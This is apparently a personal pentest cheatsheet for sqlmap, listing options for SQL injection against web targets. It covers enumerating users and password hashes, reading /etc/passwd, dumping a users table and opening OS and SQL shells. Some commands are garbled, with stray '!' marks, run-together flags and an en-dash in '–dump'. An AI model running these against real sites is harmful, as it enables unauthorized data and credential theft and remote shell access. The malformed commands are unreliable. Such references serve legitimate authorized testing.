---
title: Sqlmap Cheatsheet  
date: 2022-12-04 22:35:00 +00:00
categories: [cheatsheet, tools]
tags: [tools]     # TAG names should always be lowercase
---

# Burp + sqlmap 

Save a request in burp (right click > save to file) 

Run with sqlmap 

```
sqlmap -r sqlmap.txt --batch
```
# Generic

```
-u "<URL>" 
-p "<PARAM TO TEST>" 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```

# Internals

```
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```

# Reafile 

```
--file-read=/etc/passwd
```

# Specify param to exploit

```
sqlmap -u "http://target_server/param1=value1&param2=value2" -p param1
```

# Use POST requests

```
sqlmap -u "http://target_server" --data=param1=value1&param2=value2
```

# Access with authenticated session

```
sqlmap -u "http://target_server" --data=param1=value1&param2=value2 -p param1 cookie='my_cookie_value'
```

# Basic authentication

```
sqlmap -u !http://target_server! -s-data=param1=value1&param2=value2 -p param1--auth-type=basic --auth-cred=username:password
```

# Evaluating response strings

```
sqlmap -u "http://target_server/" --string="This string if query is TRUE"

sqlmap -u "http://target_server/" --not-string="This string if query is FALSE"
```

# List all databases at the site

```
sqlmap -u "http://testsite.com/login.php" --dbs
```

# List all tables in a specific database

```
sqlmap -u "http://testsite.com/login.php" -D site_db --tables
```

# List all columns in a table

```
sqlmap -u "http://testsite.com/login.php" -D site_db -T users --columns
```

# Dump the contents of a DB table

```
sqlmap -u "http://testsite.com/login.php" -D site_db -T users –dump
```

# Shell 

Get OS Shell
```
--os-shell
```

Get SQL Shell

```
--sql-shell
```
